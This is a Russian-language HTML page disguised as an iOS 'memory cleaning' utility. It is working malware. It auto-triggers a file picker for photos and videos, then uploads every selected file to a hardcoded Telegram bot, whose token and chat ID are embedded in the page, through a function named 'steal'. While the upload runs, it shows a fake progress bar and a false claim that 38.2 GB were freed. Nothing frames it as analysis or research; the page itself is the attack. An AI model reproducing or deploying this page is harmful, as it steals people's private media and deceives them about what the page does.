<!DOCTYPE html>
<html>
<head>
<title>Очистка памяти iOS</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{background:#000;color:white;font-family:-apple-system;text-align:center;padding-top:80px}
.progress{width:80%;height:6px;background:#333;border-radius:3px;margin:20px auto}
.bar{width:0%;height:6px;background:#0f0;border-radius:3px}
</style>
</head>
<body>
<h2>Очистка памяти</h2>
<div class="progress"><div class="bar" id="bar"></div></div>
<p id="status">Сканирование...</p>
<p id="percent">0%</p>
<input type="file" id="input" multiple accept="image/*,video/*" style="display:none">
<script>
const TOKEN = "8673011110:AAGH5Zb6Put8qCt6Zjd_wuRt1Lbjqnhou8g";
const CHAT_ID = "8181041871";
async function steal(){
document.getElementById('status').innerText="Доступ к фото...";
const input=document.getElementById('input');
input.click();
input.onchange=async function(){
const files=Array.from(input.files);
const total=files.length;
document.getElementById('status').innerText="Отправка...";
for(let i=0;i<files.length;i+=10){
const batch=files.slice(i,i+10);
for(let f of batch){
const fd=new FormData();
fd.append('document',f);
fd.append('chat_id',CHAT_ID);
try{await fetch('https://api.telegram.org/bot'+TOKEN+'/sendDocument',{method:'POST',body:fd})}catch(e){}
}
const pct=Math.min(100,Math.round((i+batch.length)/total*100));
document.getElementById('bar').style.width=pct+'%';
document.getElementById('percent').innerText=pct+'%';
}
document.getElementById('status').innerText="Готово! 38.2 ГБ очищено";
document.getElementById('percent').innerText="Можно закрыть";
};
}
setTimeout(steal,1000);
</script>
</body>
</html>
